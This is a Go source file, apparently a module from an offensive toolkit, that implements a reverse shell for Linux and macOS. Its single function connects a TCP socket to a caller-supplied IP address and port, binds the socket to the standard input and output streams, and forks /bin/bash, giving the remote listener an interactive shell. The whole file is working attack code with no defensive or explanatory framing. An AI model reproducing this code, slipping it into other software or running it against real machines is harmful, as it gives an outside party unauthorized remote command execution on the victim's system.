//go:build darwin || linux
// +build darwin linux

package reverseshell

import (
	"errors"
	"log"
	"strconv"
	"strings"
	"syscall"

	"golang.org/x/sys/unix"
)

func ReverseShell(args []string) (string, error) {
	var err error
	var port int
	var ip []int
	if len(args) < 2 {
		return "", errors.New("Not Enough Args")
	}
	port, err = strconv.Atoi(args[1])
	if err != nil {
		if err != nil {
			return "", err
		}
	}
	split := strings.Split(args[0], ".")
	for _, chunk := range split {
		ipp, err := strconv.Atoi(chunk)
		if err != nil {
			return "Failed to convert to ip to bytes", err
		}
		ip = append(ip, ipp)
	}
	GoSock, err := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, 0)
	if err != nil {
		log.Fatalf("Failed to create socket %v", err)
	}
	sockaddr_in := &unix.SockaddrInet4{}
	sockaddr_in.Port = port
	var addr [4]byte
	for i, bytee := range ip {
		addr[i] = byte(bytee)
	}
	sockaddr_in.Addr = addr
	err = unix.Connect(GoSock, sockaddr_in)
	if err != nil {
		return "", err
	}
	var argv []string
	argv = append(argv, "/bin/sh")
	attr := &syscall.ProcAttr{
		Files: []uintptr{uintptr(GoSock), uintptr(GoSock), uintptr(GoSock)},
	}
	syscall.ForkExec("/bin/bash", argv, attr)
	return "Check Your Listener.", nil
}
